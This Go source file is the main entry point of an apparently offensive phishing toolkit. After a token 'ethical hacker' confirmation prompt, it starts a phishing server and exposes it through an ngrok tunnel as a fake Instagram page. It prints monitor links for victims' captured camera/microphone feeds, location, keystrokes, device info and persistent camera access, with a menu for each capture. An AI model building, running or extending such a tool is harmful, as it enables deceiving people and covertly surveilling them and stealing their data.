package main

import (
	"fmt"
	"os"
	"thundrx/internal"
)

func main() {
	internal.PrintBanner()

	if !internal.ConfirmEthicalHacker() {
		fmt.Println("Authorization failed. Exiting.")
		os.Exit(1)
	}

	internal.EnsureResultsFolders() // Ensure all result directories exist

	// Find a free port and set it globally
	internal.ServerPort = internal.FindFreePort()

	// Start main phishing server and ngrok in background
	go func() {
		r := internal.NewRouter()
		internal.RegisterPhishingRoutes(r)
		internal.StartPhishServer(internal.ServerPort, r)
	}()

	go func() {
		ngrokURL, _, err := internal.StartNgrok(internal.ServerPort)
		if err != nil {
			fmt.Println("[!] Ngrok failed:", err)
			return
		}
		internal.NgrokBaseURL = ngrokURL
		fmt.Println("[NGROK] Public phishing link:", ngrokURL+"/cam_mic/instagram.html")
		fmt.Println("[NGROK] Result monitor (cam/mic):", ngrokURL+"/monitor/cam_mic")
		fmt.Println("[NGROK] Result monitor (location):", ngrokURL+"/monitor/location")
		fmt.Println("[NGROK] Result monitor (keylogs):", ngrokURL+"/monitor/keylogs")
		fmt.Println("[NGROK] Result monitor (device info):", ngrokURL+"/monitor/device_info")
		fmt.Println("[NGROK] Result monitor (persistent cam):", ngrokURL+"/monitor/persistent_cam")
	}()

	for {
		choice := internal.ShowMenu()
		switch choice {
		case "a":
			internal.HandleCamMic()
		case "b":
			internal.HandleLocation()
		case "c":
			internal.HandleKeylogger()
		case "d":
			internal.HandleDeviceInfo()
		case "f":
			internal.HandlePersistentCam()
		case "q":
			fmt.Println("Goodbye.")
			return
		default:
			fmt.Println("Invalid option.")
		}
	}
}
